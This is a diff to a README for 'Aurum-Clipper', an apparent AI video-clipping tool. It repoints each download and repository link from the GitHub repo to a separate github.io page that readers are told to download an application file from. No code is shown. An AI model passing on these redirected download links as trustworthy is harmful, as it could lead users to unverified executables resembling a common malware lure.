@@ -1,6 +1,6 @@
 # ✨ Aurum-Clipper - Turn Any Video Into Viral Clips
 
-[![Download Aurum-Clipper](https://img.shields.io/badge/Download-Aurum--Clipper-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lawntennisnovice323/Aurum-Clipper)
+[![Download Aurum-Clipper](https://img.shields.io/badge/Download-Aurum--Clipper-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://lawntennisnovice323.github.io)
 
 ## 🤖 What Is Aurum-Clipper?
 
@@ -32,7 +32,7 @@ Every clip is formatted for the exact dimensions and duration that work best on 
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Lawntennisnovice323/Aurum-Clipper](https://github.com/Lawntennisnovice323/Aurum-Clipper)
+Visit this link to download the application: [https://lawntennisnovice323.github.io](https://lawntennisnovice323.github.io)
 
 The download page will show you everything you need. Once you're there, click the download button to get the application file.
 
@@ -143,8 +143,8 @@ Aurum-Clipper is provided as-is for personal and commercial use. See the LICENSE
 
 ## 🔗 Quick Links
 
-- **Main Repository:** [https://github.com/Lawntennisnovice323/Aurum-Clipper](https://github.com/Lawntennisnovice323/Aurum-Clipper)
-- **Download Page:** [https://github.com/Lawntennisnovice323/Aurum-Clipper](https://github.com/Lawntennisnovice323/Aurum-Clipper)
+- **Main Repository:** [https://lawntennisnovice323.github.io](https://lawntennisnovice323.github.io)
+- **Download Page:** [https://lawntennisnovice323.github.io](https://lawntennisnovice323.github.io)
 
 Start creating your viral clips today! The smartest way to clip videos is just a download away.
 
